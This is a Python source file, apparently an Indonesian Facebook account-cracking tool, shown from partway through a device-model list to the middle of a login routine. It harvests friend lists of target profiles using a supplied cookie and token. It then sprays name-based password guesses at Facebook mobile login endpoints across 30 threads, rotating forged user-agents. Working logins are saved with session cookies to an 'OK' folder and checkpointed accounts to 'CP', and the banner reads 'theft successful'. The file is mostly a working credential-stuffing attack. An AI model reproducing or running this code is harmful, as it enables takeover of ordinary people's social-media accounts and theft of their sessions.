5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; SM-{str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    uateddy = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix, strvsamsung, strvredmi1, strvnokiax, strvgt])
    strv666.append(uateddy)

def real_time():
	from time import time
	return str(time()).split('.')[0]

def banner():
	os.system("clear")
	cetak(nel("""[b blue]     _/_/_/    _/_/    _/_/_/_/  _/_/_/   [/][b cyan]GENERASI[/]  [b red]██████████████████[/]
[b blue]  _/        _/    _/  _/          _/      [/][b cyan]ACCOUNT[/]   [b red]██████████████████[/]
[b blue] _/  _/_/  _/_/_/_/  _/_/_/      _/       [/][b cyan]FACEBOOK[/]  [b white]██████████████████[/]
[b blue]_/    _/  _/    _/  _/          _/        [/][b cyan]INDONESIA[/] [b white]██████████████████[/]
[b blue] _/_/_/  _/    _/  _/        _/_/_/       [/][b white]Code By [b green]Nugraha [b white]X [b green]TEAM[/]""",title=" [[b green] MAIN MENU[/] ] ",style="b blue"))

def cek():
	try:
		tok = open('t.txt','r').read()
		cok = open('c.txt','r').read()
		MainMenu()
	except Exception as e:
		cetak(nel(f'[[dark_orange]+[/]] {e}'))
		login()

def login():
	os.system('clear')
	try:
		banner()
		text = Text('PASTIKAN JANGAN MENGGUNAKAN AKUN PRIBADI',justify='center')
		cetak(nel(text,title="WARNING",border_style='b blue'))
		cokis = console.input('  [[b blue]+[/]] MASUKAN COOKIE : ')
		cokie = {'cookie': cokis}
		data1 = {'access_token': '437340816620806|04a36c2558cde98e185d7f4f701e4d94', 'scope': ''}
		post1 = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data1).json()
		code1 = post1['code']
		code2 = post1['user_code']
		urlg1 = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94'%(code1)
		urlg2 = sop(ses.get('https://mbasic.facebook.com/device',cookies=cokie).content, "html.parser")
		form1 = urlg2.find('form', {'method':'post'})
		data2 = {
			'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form1)).group(1),
			'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form1)).group(1),
			'qr': '0',
			'user_code': code2
		}
		post2 = 'https://mbasic.facebook.com'+form1['action']
		post3 = sop(ses.post(post2,data=data2,cookies=cokie).content, 'html.parser')
		data2 = {}
		form2 = post3.find('form', {'method':'post'})
		for x in form2('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					data2.update({x['name']:x['value']})
			except Exception as e:
				pass
		post4 = 'https://mbasic.facebook.com'+form2['action']
		post5 = sop(ses.post(post4,data=data2,cookies=cokie).content,'html.parser')
		urlg3 = ses.get(urlg1,cookies=cokie).json()
		token = urlg3['access_token']
		text = Text(f'{token}',justify='center')
		cetak(nel(text))
		kot = open('t.txt','w').write(token)
		koc = open('c.txt','w').write(cokis)
		masuk = input(f'\n[{H}!{P}] tekan enter')
		os.system('clear')
		cek()
	except Exception as e:
		print(e)

def keluar():
	os.system('rm -rf t.txt && rm -rf c.txt')
	os.system('clear')
	login()

def MainMenu():
	os.system("clear")
	banner()
	urt = []
	urt.append(nel('[[b blue]01[/]]. CRACK PUBLIK',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]02[/]]. CRACK MASSAL',width=25,border_style='b blue',padding=(0,2)))
	urt.append(nel('[[b blue]03[/]]. CHECK RESULT',width=24,border_style='b blue'))
	console.print(Columns(urt))
	ch = console.input('[b blue] +[/] Pilih : ')
	if ch in ["01","1"]:
		publik()
	elif ch in ["02","2"]:
		massal()
	elif ch in ["03","3"]:
		checkresult()
	elif ch in ["04","4"]:
		file =console.input('[b blue] +[/] masukan nama folder/file : ')
		try:
			uid = open(file,"r").read().splitlines()
			for data in uid:
				try:user,nmf = data.split('|')
				except:continue
				sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
				sys.stdout.flush()
				id.append(data)
		except FileNotFoundError:exit(f" [*] file tidak ada")
		dump()
	elif ch in ["rm"]:
		keluar()
	else:
		print(f"Coba Pilih Yang Bener.!!!");time.sleep(1);exit()

def checkresult():
	files = []
	urt = []
	urt.append(nel('[[b blue]01[/]]. RESULTS [b green]OK[/]',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]02[/]]. RESULTS [b yellow]CP[/]',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]03[/]]. BACK TO MENU',width=25,border_style='b blue',padding=(0,2)))
	console.print(Columns(urt))
	res = console.input('[b blue] +[/] Pilih : ')
	if res in["1","01"]:
		dirs = os.listdir("OK")
		print(f'\n[{H}!{P}] Sudah Ditemukan {len(dirs)} File Hasil OK')
		print('')
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalok = open(f"OK/{file}","r").read().splitlines()
			print(f'[{H}{num}{P}] {file} {len(totalok)} Akun ')
		bngst = input(f"\n[{H}!{P}] Pilihan 1 Sampai {num} : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open("OK/%s"%(kontol)).read().splitlines()
		except IOError:
			exit("\nfile %s tidak tersedia"%(kontol))
		print(f'\n[{H}1{P}] Tampilkan Cookie Saat Memeriksa Hasil')
		print(f'[{H}2{P}] Jangan Tampilkan Cookie Saat Memeriksa Hasil')
		ask = input(f'\n[{H}!{P}] Pilihan 1 Sampai 2 : ')
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print(f'\nTanggal Hasil File : {del_txt} - Total Akun : {len(totalok)}\n')
		if ask in["1"]:
			for z in totalok:
				print(f"{H}{z}")
		else:
			for z in totalok:
				data = z.replace(" * --> ","")
				user,pw = data.split("|")[0],data.split("|")[1]
				print(f"{H}{user}|{pw}")
		print(f'\n{P}Sukses Memeriksa File Dan Menemukan {len(totalok)} Akun Di File')
		exit()
	elif res in["2","02"]:
		dirs = os.listdir("CP")
		print(f'\nSudah Ditemukan {len(dirs)} File Hasil OK')
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalcp = open(f"CP/{file}","r").read().splitlines()
			print(f'\n0{num} {file} {len(totalcp)} Akun ')
		bngst = input(f"\nPilihan 1 Sampai {num} : ")
		try:
			kontol = files[int(bngst)-1]
			totalcp = open("CP/%s"%(kontol)).read().splitlines()
		except IOError:
			exit("file %s tidak tersedia"%(kontol))
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print(f'\nTanggal Hasil File : {del_txt} - Total Akun : {len(totalcp)}')
		print("%s"%(K))
		os.system("cat CP/%s"%(kontol))
		print(f'\n{P}Sukses Memeriksa File Dan Menemukan {len(totalcp)} Akun Di File')
		exit()
	elif res in["3","03"]:
		MainMenu()
	else:
		exit()

def publik():
	tok = open("t.txt","r").read()
	cok = {"cookie":open('c.txt','r').read()}
	kun = console.input(f'[b blue] +[/] Masukan Target : ')
	try:
		gam = requests.get(f"https://graph.facebook.com/v15.0/{kun}?fields=friends.limit(5000)&access_token={tok}",cookies=cok).json()
		for dap in gam['friends']['data']:
			try:
				id.append(dap['id']+"|"+dap['name'])
			except:continue
		dump()
	except (KeyError,IOError):
		print('\nakun tidak publik ! ')
		time.sleep(1)
		os.system('clear')
		MainMenu()

def dump():
	cetak('[b blue] +[/] Berhasil Mengumpulkan  : [b blue]%s[/]'%(len(id)))
	urutan()

def massal():
	tok = open("t.txt","r").read()
	cok = {"cookie":open('c.txt','r').read()}
	text = Text('Ketik ME Jika Ingin Crack Pertemanan Sendiri',justify='center')
	cetak(nel(text,border_style='b blue'))
	try:tanya_total = int(console.input('[b blue] +[/] Masukan Jumlah Target : '))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		user = console.input('[b blue] +[/] Masukan ID Ke [b green]0%s[/] : '%(t))
		try:
			gam = requests.get(f"https://graph.facebook.com/v15.0/{user}?fields=friends.limit(5000)&access_token={tok}",cookies=cok).json()
			for dap in gam['friends']['data']:
				try:
					id.append(dap["id"]+"|"+dap["name"])
				except:continue
		except KeyError:
				cetak(nel('[[b blue]•[/]] Akun Bersifat Private'));time.sleep(3);exit()
		except requests.exceptions.ConnectionError:
			cetak(nel('[[b blue]•[/]] Tidak Ada Koneksi Internet'))
	else:
		urutan()

def urutan():
	urt = []
	urt.append(nel('[[b blue]01[/]]. URUTAN TUA',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]02[/]]. URUTAN MUDA',width=25,border_style='b blue',padding=(0,2)))
	urt.append(nel('[[b blue]03[/]]. URUTAN RANDOM',width=24,border_style='b blue'))
	console.print(Columns(urt))
	urut = console.input('[b blue] +[/] Pilih Urutan Akun : ')
	if urut in ['1']:
		for tua in sorted(id):
			id2.append(tua)
		settingua()
	elif urut in ['2']:
		for baru in id:
			id2.insert(0,baru)
		settingua()
	elif urut in ['3']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
		settingua()
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
		settingua()

uadia, uadarimu = [], []
def settingua():
	text = Text('Pilih Useragent Yang Cocok Di Davicemu',justify='center')
	cetak(nel(text,border_style='b blue'))
	ua = console.input("[b blue] +[/] Gunakan Useragent Manual? (Y/T) : ")
	if ua in ["y","Y"]:
		uadarimu.append('uadia')
		text = Text('Pastekan Useragent Kalian',justify='center')
		cetak(nel(text,border_style='b blue'))
		uamanual = console.input(f"[b blue] +[/] Masukan Useragent Anda : ")
		uadia.append(uamanual)
		tambahan()
	else:
		uadarimu.append(f"{ua}")
		tambahan()

def tambahan():
	text = Text('GUNAKAN KOMBINASI PASSWORD MANUAL,\nEXAMPLE : pranata,sayang,prilly... Gosah Bacot:v',justify='center')
	cetak(nel(text,border_style='b blue',title=" [[b yellow]WARNING[/]] "))
	pwplus = console.input('[b blue] +[/] Tambahkan Password Gabungan ( Y/T ) : ') 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		text = Text('Masukkan Katasandi Tambahan Minimal 6 Karakter',justify='center')
		cetak(nel(text,border_style='b blue'))
		pwku = console.input('[b blue] +[/] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	elif pwplus in ['t','T']:
		ChoiceMethod()
	else:
			pwpluss.append('no')
	ChoiceMethod()
		
def ChoiceMethod():
	urt = []
	urt.append(nel('[[b blue]01[/]]. VALIDATE V1',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]02[/]]. REGULAR V1',width=25,border_style='b blue',padding=(0,2)))
	urt.append(nel('[[b blue]03[/]]. ASYNC V1',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]04[/]]. VALIDATE V2',width=24,border_style='b blue'))
	urt.append(nel('[[b blue]05[/]]. REGULAR V2',width=25,border_style='b blue',padding=(0,2)))
	urt.append(nel('[[b blue]06[/]]. ASYNC V2',width=24,border_style='b blue'))
	console.print(Columns(urt))
	met = console.input('[b blue] +[/] Pilih Method : ')
	if met in ["1","01"]:
		Validate()
	elif met in ["2","02"]:
		Regular()
	elif met in ["3","03"]:
		Async()
	elif met in ["4","04"]:
		Validate2()
	elif met in ["5","05"]:
		Regular2()
	elif met in ["6","06"]:
		Async_V2()
	else:
		os.system("Isi Yang Bener Anjing")
		time.sleep(1)
		exit()

def Validate():
	global prog,des
	cetak(nel(f'Hasil [b green]OK[/] Tersimpan Di : [b green]OK/{okc}',border_style='b blue',padding=(0,6)))
	cetak(nel(f'Hasil [b yellow]CP[/] Tersimpan Di : [b yellow]CP/{cpc}',border_style='b blue',padding=(0,6)))
	text = TextColumn('{task.description}')
	barc = BarColumn(bar_width=None, table_column=Column(ratio=2))
	wakt = TextColumn('{task.percentage:.0f}%')
	prog = Progress(text, barc, wakt, expand=True)
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as nugraha_gans:
			for nugraha_in_here in id2:
				user,nmf = nugraha_in_here.split('|')[0],nugraha_in_here.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				nugraha_gans.submit(Validate_V1,user,pwv)
		text = Text(f'OK : {ok} CP : {cp}',justify='center')
		cetak(nel(text,title=' MALING BERHASIL '))
		exit()

def Validate_V1(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[[b green]VALIDATE V1[/]] {loop}/{len(id)} OK:-[green]{ok}[/] CP:-[yellow]{cp}[/]")
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(strv666)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else: ua
			headers = {
				"Host": "m.facebook.com",
				"cache-control": "max-age=0",
				"sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
				"sec-ch-ua-mobile": "?1",
				"upgrade-insecure-requests": "1",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9"
			}
			response = sop(
				ses.get(
					'https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr',headers=headers
				).text, "html.parser"
			)
			data = {
				x.get("name"):x.get("value") for x in response.findAll("input",
				{"type":"hidden", "value":True})
			}
			data.update(
				{
					"uid":user,
					"pass":pw
				}
			)
			headers.update(
				{
					"referer": "https://m.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr",
				}
			)
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=data, headers=headers)
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
				kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall('c_user=(.*);xs', kukis)[0]
				tree = Tree(f'[white]┌─[ [bold green]SUCCESSFUL[white] ]',style='blue')
				tree.add(f'[b green]{user}[/]|[b green]{pw}[/]').add(f'[b green]{kukis}[/]')
				cetak(tree)
				open('OK/'+okc,'a').write(user+'|'+pw+'|'+kukis+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(f'[white]┌─[ [bold yellow]CHECKPOINT[white] ]',style='blue')
				tree.add(f'[b yellow]{user}[/]|[b yellow]{pw}[/]').add(f'[b purple]{ua}[/]')
				cetak(tree)
				open('CP/'+cpc,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Regular():
	global prog,des
	cetak(nel(f'Hasil [b green]OK[/] Tersimpan Di : [b green]OK/{okc}',border_style='b blue',padding=(0,6)))
	cetak(nel(f'Hasil [b yellow]CP[/] Tersimpan Di : [b yellow]CP/{cpc}',border_style='b blue',padding=(0,6)))
	text = TextColumn('{task.description}')
	barc = BarColumn(bar_width=None, table_column=Column(ratio=2))
	wakt = TextColumn('{task.percentage:.0f}%')
	prog = Progress(text, barc, wakt, expand=True)
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as nugraha_gans:
			for nugraha_in_here in id2:
				user,nmf = nugraha_in_here.split('|')[0],nugraha_in_here.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				nugraha_gans.submit(RegularV1,user,pwv)
		text = Text(f'OK : {ok} CP : {cp}',justify='center')
		cetak(nel(text,title=' MALING BERHASIL '))
		exit()

def RegularV1(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[[b yellow]REGULAR V1[/]] {loop}/{len(id)} OK:-[green]{ok}[/] CP:-[yellow]{cp}[/]")
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(strv666)
	ua2 = random.choice(ugent)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else: ua
			ses.headers.update({
			'Host':'free.facebook.com',
				'cache-control':'max-age=0',
			'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
				'sec-ch-ua-mobile':'?1',
			'sec-ch-ua-platform':'"Android"',
				'upgrade-insecure-requests':'1',
			'user-agent':ua2,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site':'none',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			nu = ses.get("https://free.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De1918edc-2ea5-4ace-b98f-17e6c2305ea3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"lsd":re.search('name="lsd" value="(.*?)"',str(nu)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"',str(nu)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"',str(nu)).group(1),
			"li":re.search('name="li" value="(.*?)"',str(nu)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":user,
			"pass":pw,
			"login":"Masuk",
			"bi_xrwh":"0",
			}
			if "Masuk ke akun Facebook Anda untuk terhubung dengan Instagram" in str(nu):
				head = {
				'Host':'free.facebook.com',
				'content-length':f'{len(str(data))}',
				'cache-control':'max-age=0',
				'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
				'sec-ch-ua-mobile':'?1',
				'sec-ch-ua-platform':'"Android"',
				'upgrade-insecure-requests':'1',
				'origin':'https://free.facebook.com',
				'content-type':'application/x-www-form-urlencoded',
				'user-agent':ua,
				'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
				'sec-fetch-dest':'document',
				'referer':'https://free.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De1918edc-2ea5-4ace-b98f-17e6c2305ea3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
